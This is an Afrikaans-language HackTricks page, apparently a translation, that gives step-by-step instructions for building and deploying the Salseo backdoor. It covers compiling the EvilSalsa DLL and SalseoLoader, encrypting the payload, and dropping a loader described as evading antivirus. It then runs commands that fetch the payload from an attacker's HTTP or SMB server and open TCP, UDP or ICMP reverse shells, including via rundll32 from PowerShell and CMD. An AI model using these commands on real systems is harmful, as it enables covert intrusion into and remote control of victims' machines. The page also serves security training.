# Salseo

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Samevoeging van die binêre

Laai die bronkode van die github af en saam te stel **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode saam te stel.

Stel daardie projekte saam vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, stel dit saam vir daardie argitektuur).

Jy kan **die argitektuur kies** binne Visual Studio in die **linker "Build" Tab** in **"Platform Target".**

(\*\*As jy nie hierdie opsies kan vind nie, druk op **"Project Tab"** en dan op **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Dan, bou albei projekte (Build -> Build Solution) (Binne die logs sal die pad van die uitvoerbare verskyn):

![](<../.gitbook/assets/image (381).png>)

## Berei die Backdoor voor

Eerstens, jy sal die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** saamstel:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, nou het jy alles wat jy nodig het om al die Salseo goed te uitvoer: die **gecodeerde EvilDalsa.dll** en die **binarie van SalseoLoader.**

**Laai die SalseoLoader.exe binarie op die masjien. Hulle behoort nie deur enige AV opgespoor te word nie...**

## **Voer die backdoor uit**

### **Kry 'n TCP reverse shell (aflaai van die gecodeerde dll deur HTTP)**

Onthou om 'n nc as die reverse shell luisteraar te begin en 'n HTTP bediener op te stel om die gecodeerde evilsalsa te bedien.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kry 'n UDP omgekeerde skulp (aflaai van kodering dll deur SMB)**

Onthou om 'n nc as die omgekeerde skulp luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa (impacket-smbserver) te bedien.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kry 'n ICMP omgekeerde skulp (gecodeerde dll reeds binne die slagoffer)**

**Hierdie keer het jy 'n spesiale hulpmiddel in die kliënt nodig om die omgekeerde skulp te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktiveer ICMP Antwoorde:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Voer die kliënt uit:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Binne die slagoffer, laat ons die salseo ding uitvoer:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Samevoeging van SalseoLoader as DLL wat hoof funksie uitvoer

Open die SalseoLoader projek met Visual Studio.

### Voeg voor die hoof funksie by: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Installeer DllExport vir hierdie projek

#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet Pakkette vir Oplossing...**

![](<../.gitbook/assets/image (881).png>)

#### **Soek vir DllExport pakket (met die Blader tab), en druk Installeer (en aanvaar die pop-up)**

![](<../.gitbook/assets/image (100).png>)

In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport\_Configure.bat**

### **U**ninstalleer DllExport

Druk **Uninstall** (ja, dit is vreemd maar glo my, dit is nodig)

![](<../.gitbook/assets/image (97).png>)

### **Verlaat Visual Studio en voer DllExport\_configure uit**

Net **verlaat** Visual Studio

Gaan dan na jou **SalseoLoader gids** en **voer DllExport\_Configure.bat** uit

Kies **x64** (as jy dit binne 'n x64 boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**

![](<../.gitbook/assets/image (882).png>)

### **Open die projek weer met Visual Studio**

**\[DllExport]** moet nie langer as 'n fout gemerk wees nie

![](<../.gitbook/assets/image (670).png>)

### Bou die oplossing

Kies **Uitset tipe = Klas Biblioteek** (Projek --> SalseoLoader Eienskappe --> Aansoek --> Uitset tipe = Klas Biblioteek)

![](<../.gitbook/assets/image (847).png>)

Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)

![](<../.gitbook/assets/image (285).png>)

Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitset konsole sal die pad van die nuwe DLL verskyn)

### Toets die gegenereerde Dll

Kopieer en plak die Dll waar jy dit wil toets.

Voer uit:
```
rundll32.exe SalseoLoader.dll,main
```
As daar geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!

## Kry 'n shell met die DLL

Moet nie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel nie

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
